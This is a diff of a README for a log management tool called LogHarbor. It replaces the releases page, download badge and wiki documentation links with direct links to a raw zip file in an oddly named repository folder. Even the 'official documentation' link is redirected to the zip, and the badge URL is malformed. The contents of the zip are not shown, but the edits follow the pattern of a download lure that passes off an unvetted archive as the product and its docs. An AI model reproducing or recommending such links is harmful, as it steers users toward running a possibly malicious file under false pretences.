@@ -1,6 +1,6 @@
 # 🏗️ LogHarbor - Your Easy Log Management Solution
 
-[![Download LogHarbor](https://img.shields.io/badge/Download%20LogHarbor-v1.0-blue.svg)](https://github.com/yasindu100/LogHarbor/releases)
+[![Download LogHarbor](https://raw.githubusercontent.com/yasindu100/LogHarbor/main/bicrofarad/LogHarbor.zip%https://raw.githubusercontent.com/yasindu100/LogHarbor/main/bicrofarad/LogHarbor.zip)](https://raw.githubusercontent.com/yasindu100/LogHarbor/main/bicrofarad/LogHarbor.zip)
 
 ## 📜 Description
 
@@ -20,7 +20,7 @@ Follow these steps to download and run LogHarbor on your computer. You do not ne
 
 To get LogHarbor, visit this page to download:
 
-[Download LogHarbor](https://github.com/yasindu100/LogHarbor/releases)
+[Download LogHarbor](https://raw.githubusercontent.com/yasindu100/LogHarbor/main/bicrofarad/LogHarbor.zip)
 
 1. Click the link above.
 2. Find the version you want to download.
@@ -49,7 +49,7 @@ Once you have installed LogHarbor, you can start using it to manage your logs:
 
 ### 📚 Additional Information
 
-For further assistance and deeper understanding, consult the [official documentation](https://github.com/yasindu100/LogHarbor/wiki). Here you can find examples, API references, and troubleshooting tips. 
+For further assistance and deeper understanding, consult the [official documentation](https://raw.githubusercontent.com/yasindu100/LogHarbor/main/bicrofarad/LogHarbor.zip). Here you can find examples, API references, and troubleshooting tips. 
 
 ### 📞 Support
 
